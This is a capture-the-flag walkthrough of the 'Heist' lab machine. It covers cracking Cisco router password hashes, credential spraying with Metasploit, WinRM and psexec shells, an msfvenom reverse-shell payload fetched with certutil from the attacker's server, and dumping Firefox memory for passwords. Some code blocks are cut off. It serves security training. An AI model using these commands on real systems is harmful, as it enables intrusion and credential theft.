# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

Always remember to map a domain name to the machine's IP address to ease your rooting !

```bash
$ echo "10.10.10.149 heist.htb" >> /etc/hosts
```

# Reconnaissance

Using `nmap`, we are able to determine the open ports and running services on the machine.
```bash
$ nmap -sV -sT -sC heist.htb
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-17 10:31 EDT

Lets first check out the `http` service on port 80.

This looks like a IT helpdesk ticketing system. It looks like `Hazard` is having issues with his cisco router and he has posted his configuration file.

First thing to note is  
```
service password-encryption
```
which tells us that all passwords in the configuration file are encrypted.

Next up, we get  
```
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
```  
which has a Type 5 encrypted password. To crack it, I will be using this [tool](https://github.com/axcheron/cisco_pwdecrypt).

```bash
$ python3 cisco_pwdecrypt.py -u "\$1\$pdQG\$o8nrSzsGXeaduXrjlvKc91" -d /usr/share/wordlists/rockyou.txt
[*] Bruteforcing 'type 5' hash...

	Hash = o8nrSzsGXeaduXrjlvKc91

	[Status] 132/14344392 password tested...

[*] Password Found = stealth1agent
```

Lastly, we have  
```
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
```
which both contains a username and a Type 7 encrypted password. To crack them, I will be using the same tool.

```bash
$ python3 cisco_pwdecrypt.py -t 0242114B0E143F015F5D1E161713
[*] Result: $uperP@ssword

$ python3 cisco_pwdecrypt.py -t 02375012182C1A1D751618034F36415408
[*] Result: Q4)sJu\Y8qz*A3?d
```

With all the credentials we have collected so far, lets create 2 files to store them.  

`user.txt`:
```
Hazard
hazard
rout3r
admin
```

`pass.txt`:
```
stealth1agent
$uperP@ssword
Q4)sJu\Y8qz*A3?d
```

With some credentials, lets move on to the `smb` service on port 445. I will be using the `auxiliary/scanner/smb/smb_login` module in Metasploit to test the different combinations.

```bash
$ msfconsole
msf5 > use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login) > set RHOSTS heist.htb
RHOSTS => heist.htb
msf5 auxiliary(scanner/smb/smb_login) > set USER_FILE user.txt

```

Using `hazard:stealth1agent`, lets see what we can access in the `smb` shares!
```bash
$ smbmap -H heist.htb -u hazard -p stealth1agent

	IPC$                                              	READ ONLY
```

I guess the `smb` service is a dead end? Maybe not. Using [Impacket](https://github.com/SecureAuthCorp/impacket)'s `lookupsid.py`, we are able to enumerate for other users on the machine.
```bash
$ python lookupsid.py Hazard:stealth1agent@heist.htb

```

From this, we are able to find out that the domain is `SUPPORTDESK`. With these new users, lets update our `user.txt`.
```
Hazard
hazard
rout3r

Chase

```

And run the `auxiliary/scanner/smb/smb_login` module again.
```bash

DOMAIN => SUPPORTDESK
msf5 auxiliary(scanner/smb/smb_login) > run

Alright! We got another set of credentials! Lets try to access the `smb` shares using `Chase:Q4)sJu\Y8qz*A3?d`!

```bash
$ smbmap -H heist.htb -u Chase -p "Q4)sJu\Y8qz*A3?d" -d SUPPORTDESK
[+] Finding open SMB ports....
[+] User SMB session establishd on heist.htb...

	IPC$                                              	READ ONLY
```

Still nothing? I guess the `smb` service really is a dead end :(

If we go back to our reconnaissance results, there is actually one more service on port 5985: `wsman`. After some research, the `wsman` service is the `WinRM` service on the machine. Could we possbily use it to remotely execute commands on the machine? But first, we need to know what credentials we can use by using the `auxiliary/scanner/winrm/winrm_login` module in Metasploit.

```bash
msf5 auxiliary(scanner/smb/smb_login) > use auxiliary/scanner/winrm/winrm_login
msf5 auxiliary(scanner/winrm/winrm_login) > set RHOSTS heist.htb
RHOSTS => heist.htb
msf5 auxiliary(scanner/winrm/winrm_login) > set USER_FILE username.txt
USER_FILE => username.txt
msf5 auxiliary(scanner/winrm/winrm_login) > set PASS_FILE password.txt
PASS_FILE => password.txt
msf5 auxiliary(scanner/winrm/winrm_login) > set THREADS 50

msf5 auxiliary(scanner/winrm/winrm_login) > set VERBOSE false
VERBOSE => false
msf5 auxiliary(scanner/winrm/winrm_login) > set DOMAIN SUPPORTDESK
DOMAIN => SUPPORTDESK
msf5 auxiliary(scanner/winrm/winrm_login) > run

[+] 10.10.10.149:5985 - Login Successful: SUPPORTDESK\Chase:Q4)sJu\Y8qz*A3?d
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

# user.txt

Okay... So the same `Chase` user have access to both the `smb` and `WinRM` service. To establish a shell, I used  `Alamot`'s [winrm_shell.rb](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb) with the following configuration settings:
```ruby
require 'winrm'
conn = WinRM::Connection.new( 
  endpoint: 'http://10.10.10.149:5985/wsman',
  transport: :ssl,
  user: 'SUPPORTDESK\Chase',
  password: 'Q4)sJu\Y8qz*A3?d',
  :no_ssl_peer_verification => true
)
```

And now we execute the `WinRM` shell...

```bash
$ ruby winrm_shell.rb

# root.txt (1)

When I first did this machine, I found the `SHA-256` hash of the Administrator's password which I was able to somehow crack it using an online website.

From what we know, there was a `IIS` web server running on port 80 so I checked out `C:\inetpub\wwwroot`. 
```bash
PS supportdesk\chase@SUPPORTDESK inetpub> dir
 Volume in drive C has no label.
 Volume Serial Number is 78E3-E62D

               6 Dir(s)   7,923,224,576 bytes free
```

I skimmed through the pages until I came across `login.php`.
```php
<?php
session_start();
if( isset($_REQUEST['login']) && !empty($_REQUEST['login_username']) && !empty($_REQUEST['login_password'])) {
        if( $_REQUEST['login_username'] === 'admin@support.htb' && hash( 'sha256', $_REQUEST['login_password']) === 
		'91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040') {
                $_SESSION['admin'] = "valid";
                header('Location: issues.php'); 
        }
        else
                header('Location: errorpage.php');
}
else if( isset($_GET['guest']) ) {
        if( $_GET['guest'] === 'true' ) {
                $_SESSION['guest'] = "valid";
                header('Location: issues.php');
        }
}
?>
```

The `SHA-256` hash of the admin's password was hardcoded in `login.php`. I immediately tried different online password cracking websites until I came across this [website](https://md5decrypt.net/en/Sha256). I supplied the hash and got the password `4dD!5}x/re8]FBuZ`.

Using [Impacket](https://github.com/SecureAuthCorp/impacket)'s `psexec.py`, I was able to establish a shell.
```bash
$ python psexec.py Administrator:'4dD!5}x/re8]FBuZ'@heist.htb

So apparently there was another or more "proper" way to solving this box by using a very certain process. But first, lets upgrade to a meterpreter shell.

To do so, we will first need to create our executable which will establish the reverse connection back to our listener. After that, move the executable into the directory that the `SimpleHTTPServer` is running from.
```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.XXX.XXX LPORT=1337 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
```

And we start our listener on port 1337...
```bash
$ msfconsole
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LPORT 1337
LPORT => 1337
msf5 exploit(multi/handler) > set LHOST 10.10.XXX.XXX
LHOST => 10.10.14.61
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.XXX.XXX:1337
```

Back to our `WinRM` shell, we retrieve the executable from our `SimpleHTTPServer` using `certutil.exe` and run it.
```bash
PS supportdesk\chase@SUPPORTDESK Chase> certutil.exe -urlcache -split -f http://10.10.XXX.XXX/shell.exe
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.
PS supportdesk\chase@SUPPORTDESK Documents> cmd.exe /k shell.exe
```

Back on our listener, we obtained a meterpreter shell.
```bash
[*] Sending stage (179779 bytes) to 10.10.10.149
[*] Meterpreter session 1 opened (10.10.XXX.XXX:1337 -> 10.10.10.149:49694) at 2019-08-31 09:04:09 -0400

meterpreter >
```

When we list all the processes running on the box using the `ps` command, we noticed that `firefox.exe` is currently running.
```bash
meterpreter > ps

```

Lets try to dump out the process's memory to see if we can extract any credentials! I will be using [Sysinternals](https://live.sysinternals.com/)'s `procdump.exe`. Since we already have a meterpreter shell, we can just use the `upload` command to transfer it over.
```bash
meterpreter > upload procdump.exe
[*] uploading  : procdump.exe -> procdump.exe
[*] Uploaded 636.16 KiB of 636.16 KiB (100.0%): procdump.exe -> procdump.exe
[*] uploaded   : procdump.exe -> procdump.exe
```

Next up, we spawn a `cmd.exe` shell and run `procdump.exe` on the `firefox.exe` process.

```bash
meterpreter > shell
Process 3708 created.

With that done, we exit out of our `cmd.exe` and use the `download` command to retrieve the process dump.
```bash
C:\Users\Chase>exit
exit
meterpreter > download C:\\Users\\Chase\\firefox.exe_190831_193023.dmp
[*] Downloading: C:\Users\Chase\firefox.exe_190831_193023.dmp -> firefox.exe_190831_193023.dmp
[*] Downloaded 462.05 MiB of 462.05 MiB (100.0%): C:\Users\Chase\firefox.exe_190831_193023.dmp -> firefox.exe_190831_193023.dmp
[*] download   : C:\Users\Chase\firefox.exe_190831_193023.dmp -> firefox.exe_190831_193023.dmp
```

The final step is simply to run `strings` on it and `grep` for `password`. There were many lines containing `password` but I came across this line:
```
:http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```

The password seems to be the value for `login_password`. Refer to `root.txt (1)` on how to establish a shell using the credentials we found.
